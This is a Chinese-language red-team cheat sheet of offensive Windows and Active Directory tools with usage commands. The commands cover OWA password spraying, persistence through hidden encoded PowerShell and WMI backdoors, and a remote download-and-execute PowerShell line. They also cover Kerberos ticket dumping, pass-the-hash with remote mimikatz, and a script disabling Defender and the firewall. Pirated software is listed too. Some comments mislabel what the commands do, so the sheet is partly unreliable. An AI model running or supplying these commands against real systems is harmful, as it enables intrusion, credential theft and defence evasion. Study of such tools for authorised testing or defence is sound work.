# 1.mailsniper
* 项目地址：https://github.com/dafthack/MailSniper
* 工具用处：Microsoft Exchange 环境中搜索电子邮件中的特定术语（密码、内部情报、网络架构信息等）,MailSniper 还包括用于密码喷射、枚举用户和域、从 OWA 和 EWS 收集全局地址列表 (GAL) 以及检查组织中每个 Exchange 用户的邮箱权限的附加模块。
* 简单用法：
```
ipmo .\MailSniper.ps1

#枚举合法用户，user.txt 为字典
Invoke-UsernameHarvestOWA -ExchHostname mail.xx.cn -Domain xx.cn -thread 5 -UserList .\user.txt -OutFile .\valid.txt

#密码喷洒
Invoke-PasswordSprayOWA -ExchHostname mail.xxx.cn -UserList .\1.txt -Password xxxxx

#收集电子邮件地址
Get-GlobalAddressList -ExchHostname mail.xxx.cn -UserName xxx.cn\lu.sc -Password xxxxx -OutFile gal.txt
```
---
# 2.TREVORspray
* 项目地址：https://github.com/blacklanternsecurity/TREVORspray
* 工具用处：模块化密码喷雾器，具有线程、智能代理、战利品模块等！（主要用来爆破O365）
---
# 3.Seatbelt
* 项目地址：https://github.com/GhostPack/Seatbelt
* 工具用处：Seatbelt是一个 C# 工具，可自动收集主机的枚举数据。它可以检查安全配置，例如操作系统信息、AV、AppLocker、LAPS、PowerShell 日志记录、审核策略、.NET 版本、防火墙规则等。
* 简单用法：
```
#运行所有检查并返回所有输出
Seatbelt.exe -group=all -full

#运行检查以挖掘有关系统的有趣数据。
Seatbelt.exe -group=system

#运行检查，挖掘有关当前登录用户（如果未提升）或所有用户（如果提升）的有趣数据。
Seatbelt.exe -group=user

#运行所有杂项检查。
Seatbelt.exe -group=misc
```
---
# 4.SharPersist
* 项目地址：https://github.com/mandiant/SharPersist
* 工具用处：Windows 持久性工具包
* 简单用法：
```
#通过计划任务
SharPersist.exe -t schtask -c "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" -a "-nop -w hidden -enc payload" -n "Updater" -m add -o hourly

#通过启动文件夹
SharPersist.exe -t startupfolder -c "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" -a "-nop -w hidden -enc payload" -f "UserEnvSetup" -m add

#通过注册表
SharPersist.exe -t reg -c "C:\ProgramData\backdoor.exe" -a "/q /n" -k "hkcurun" -v "Updater" -m add
```
---
# 5.Sysinternals Suite
* 项目地址：https://learn.microsoft.com/en-us/sysinternals/downloads/sysinternals-suite
* 工具用处：帮助用户管理、诊断和解决 Windows 系统问题
* 常用工具说明：
```
Process Explorer (procexp.exe):
这是一个高级的任务管理器替代品，提供了更详细的进程信息、性能图表、资源消耗分析等功能。它允许用户查看系统中运行的所有进程，并提供了对它们进行监视、结束、调试等操作的功能。

Autoruns (autoruns.exe):
这个工具用于管理系统启动时自动加载的程序和服务。它允许用户查看和管理各种自启动项，包括注册表、启动文件夹、计划任务等，帮助识别和解决系统启动速度慢或系统启动时出现的问题。

Process Monitor (procmon.exe):
这是一个高级的系统监视工具，用于捕获和显示系统活动，如文件系统、注册表和进程/线程活动。它可以帮助用户诊断应用程序问题、查找系统瓶颈以及进行安全审计。

TCPView (tcpview.exe):
这个工具用于监视系统上所有 TCP 和 UDP 网络连接的实时状态。它提供了对网络连接的详细信息，包括本地和远程地址、协议、状态等，帮助用户诊断网络问题和监视系统的网络活动。

Disk Usage (du.exe):
这个工具用于显示指定路径下的文件和文件夹的磁盘使用情况统计信息。它可以帮助用户快速了解磁盘上哪些文件和文件夹占用了大量的空间，从而进行磁盘清理和优化。
```

# 6.SharpUp
* 项目地址：https://github.com/GhostPack/SharpUp
* 工具用处：继承与PowerSploit，仅有提权类型的检测，无武器化
* 简单用法：
```
#检查系统中是否存在未引号包裹的服务路径（Unquoted Service Path）漏洞
SharpUp.exe audit UnquotedServicePath

#弱服务权限，找到可修改的服务：
SharpUp.exe audit ModifiableServices

#弱二进制服务检测，找到可修改的二进制文件 exe
SharpUp.exe audit ModifiableServiceBinaries
```
---

# 7. PowerSploit
* 项目地址：https://github.com/PowerShellMafia/PowerSploit
* 工具用处：PowerSploit是一款用于在Windows环境下进行渗透测试和红队操作的强大的开源工具集，主要基于PowerShell脚本，提供了多种攻击模块和功能。
```
# 获取当前用户所在域的名称
Get-NetDomain
# 获取所有用户的详细信息
Get-NetUser
# 获取所有域控制器的信息
Get-NetDomainController
# 获取域内所有机器的详细信息
Get-NetComputer
# 获取域中所有当前计算机对象的数组
Get-NetPrinter
# 获取域内的 OU 信息
Get-NetOU
# 获取所有域内组和组成员的信息
Get-NetGroup
# 获取指定域组中所有当前用户的列表
Get-NetGroupMember
# 根据 SPN 获取当前域使用的文件服务器信息
Get-NetFileServer
# 获取当前域内所有的网络共享信息
Get-NetShare
# 获取域上所有分发文件系统共享的列表
Get-DFSshare
# 获取域的其他网段
Get-NetSubnet
# 获取域内的当前站点
Get-NetSite
# 获取当前用户域的所有信任
Get-NetDomainTrust
# 获取与当前用户的域关联的林的所有信任
Get-NetForestTrust
# 枚举在其主域之外的组中的用户
Find-ForeignUser
# 枚举域组的所有成员并查找查询域之外的用户
Find-ForeignGroup
# 尝试构建所有域信任的关系映射
Invoke-MapDomainTrust
# 获取主动登录到指定服务器的用户
Get-NetLoggedon
# 获取一个或多个远程主机上本地组的成员
Get-NetLocalGroup
# 获取指定服务器的会话
Get-NetSession
# 获取指定服务器的远程连接
Get-NetRDPSession
# 获取远程主机的进程
Get-NetProcess
# 获取指定用户的日志
Get-UserEvent
# 获取活动目录的对象
Get-ADObject
# 获取域内所有的组策略对象
Get-NetGPO
# 获取域中设置”受限组”的所有 GPO
Get-NetGPOGroup
# 获取用户/组，并通过 GPO 枚举和关联使其具有有效权限的计算机
Find-GPOLocation
# 获取计算机并通过 GPO 枚举确定谁对其具有管理权限
Find-GPOComputerAdmin
# 获取域默认策略或域控制器策略
Get-DomainPolicy
# 返回指定域的 SID
Get-DomainSID
# 获取域用户登录的计算机信息及该用户是否有本地管理员权限
Invoke-UserHunter
# 通过查询域内所有的机器进程找到特定用户
Invoke-ProcessHunter
# 根据用户日志查询某域用户登录过哪些域机器
Invoke-UserEventHunter
# 在本地域中的主机上查找（非标准）共享
Invoke-ShareFinder
# 在本地域中的主机上查找潜在的敏感文件
Invoke-FileFinder
# 在域上查找当前用户具有本地管理员访问权限的计算机
Find-LocalAdminAccess
# 搜索受管理的活动目录安全组并标识对其具有写访问权限的用户，即这些组拥有添加或删除成员的能力
Find-ManagedSecurityGroups
# 发现系统可能易受常见攻击
Get-ExploitableSystem
# 枚举域中所有计算机上本地管理员组的成员
Invoke-EnumerateLocalAdmin
# 获取无约束委派计算机
Get-NetComputer -Unconstrained
# 获取约束委派用户
Get-NetnUser -TrustedToAuth | Select-Object userprincipalname, msds-allowedtodelegateto
# 获取约束委派机器
Get-NetComputer -TrustedToAuth | Select-Object name, msds-allowedtodelegateto
```

---
# 8.ElevateKit
* 项目地址：https://github.com/cobalt-strike/ElevateKit
* 项目用处：cs 提权工具包

---
# 9.cs4.7
* 无需解释

---
# 10.PowerLurk-master
* 项目地址：https://github.com/Sw4mpf0x/PowerLurk
* 项目用处：构建恶意 WMI 事件订阅的 PowerShell 工具集（持久化）
* 简单用法：
```
本地导入：
PS> powershell.exe -NoP -Exec ByPass -C Import-Module c:\\temp\\PowerLurk.ps1
远程导入：
PS> powershell.exe -NoP -C "IEX (New-Object Net.WebClient).DownloadString('http://<IP>/PowerLurk.ps1'); Get-WmiEvent"


#返回名称为“RedTeamEvent”的所有活动 WMI 事件对象
Get-WmiEvent -Name 名称
#删除“RedTeamEvent”WMI 事件对象
Get-WmiEvent -Name RedTeamEvent | Remove-WmiObject



#注册-MaliciousWmiEvent（此 cmdlet 是 PowerLurk 的核心）
#每当 notepad.exe 启动时，执行后门 http.exe
Register-MaliciousWmiEvent -EventName WmiBackdoor -PermanentCommand "C:\Users\lsc\Desktop\http.exe" -Trigger ProcessStart -ProcessName notepad.exe
#清除恶意 WMI 事件（名称为WmiBackdoor）
Get-WmiEvent -Name WmiBackdoor | Remove-WmiObject
```
---

# 11.mimikatz
* 项目地址：https://github.com/gentilkiwi/mimikatz
* 项目用处：无需解释
---
# 12.Rubeus
* 项目地址：https://github.com/GhostPack/Rubeus
* 项目用处：用于 Windows Kerberos 黄金票据攻击、Silver Ticket 攻击、票据转储和其他相关攻击的开源工具
* 简单用法：
```
#列出当前登录会话中的所有 Kerberos 票证，如果提升，则列出计算机上所有登录会话中的所有 Kerberos 票证。
Rubeus.exe triage

#从内存中提取 tgt
Rubeus.exe dump /luid:0x7049f /service:krbtgt
#如果没有/luid:0x7049f /service:krbtgt，Rubeus 将提取所有可能的票证

```
---
# 13.KMS
* 项目地址：https://github.com/zbezj/HEU_KMS_Activator
* 项目用处：激活 ms 各项软件

---
# 14.close-df.txt
* 项目用处：ps 命令关闭win 所有防御措施，实时防护需要组策略关闭，否则为临时关闭状态
```
# 禁用 Windows Defender 实时保护
Set-MpPreference -DisableRealtimeMonitoring $true
# 云保护等级设置为 "高"，相当于禁用云保护
Set-MpPreference -CloudBlockLevel High
# 禁用 Windows Defender 网络检查
Set-MpPreference -DisableIOAVProtection $true
# 禁用 Windows Defender 自动扫描
Set-MpPreference -DisableArchiveScanning $true
# 禁用 Windows Defender 行为监控
Set-MpPreference -DisableBehaviorMonitoring $true
# 禁用 Windows 防火墙
Set-NetFirewallProfile -Profile Domain,Public,Private -Enabled False
#添加排除目录
Add-MpPreference -ExclusionPath 'C:\'

# 禁用 UAC
New-ItemProperty -Path "HKLM:\System\CurrentControlSet\Control\Lsa" -Name DisableRestrictedAdmin -value 0
Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" -Name LocalAccountTokenFilterPolicy -Value 1 -Type DWord



gpedit.msc
计算机配置 > 管理模板 > Windows 组件 > Windows Defender 防病毒
关闭实时保护>启用
```
---
# 15.CrackMapExec
* 项目地址：https://github.com/byt3bl33d3r/CrackMapExec
* 项目用处：一款功能强大的命令行工具，具有远程命令执行、哈希传递攻击、哈希收集、信息收集、服务扫描和识别等功能，旨在简化渗透测试和红队操作过程。
* 简单用法：
```
# 1. 扫描目标主机上的 SMB 服务
crackmapexec smb target_ip

# 2. 使用用户名和密码进行 SMB 身份验证
crackmapexec smb target_ip -u username -p password

# 3. 使用哈希传递进行 SMB 身份验证
crackmapexec smb target_ip -u username -H NTLM_hash

# 4. 扫描整个子网上的 SMB 服务
crackmapexec smb 192.168.1.0/24

# 5. 导出目标主机上的哈希值
crackmapexec smb target_ip -oG output.txt

# 6. 列出目标主机上的共享资源
crackmapexec smb target_ip --shares

# 7. 列出目标主机上的用户
crackmapexec smb target_ip --users

# 8. 列出常见的密码
crackmapexec smb target_ip --passwords

# 9. 检查目标主机上的密码策略
crackmapexec smb target_ip --pass-pol

# 10. 在目标主机上执行 Mimikatz
crackmapexec smb target_ip -M mimikatz

# 11. 在目标主机上执行自定义命令（示例：列出所有用户）
crackmapexec smb target_ip -x 'net user'

# 12. 使用密码字典进行密码破解
crackmapexec smb target_ip -u username -P /path/to/passwords.txt

# 13. 执行命令
crackmapexec smb target_ip -u username -H NTLM_hash -x 'whoami'

```
---
# 16.kerberoast
* 项目地址：https://github.com/nidem/kerberoast
* 项目用处：主要用于kerberoast攻击
---
# 17.ADSearch
* 项目地址：https://github.com/tomcarver16/ADSearch
* 项目用处：ad信息收集常用工具
已直接构建成exe
---
# 18.Defender Control
* 项目地址：https://www.sordum.org/9480/defender-control-v2-1/
* 项目用处：彻底关闭wd，不会自动重启wd相关防御组件
* 使用方式
```
1.先用Defender_Settings关闭实时防护和防篡改保护
2.启动程序，关闭df
```































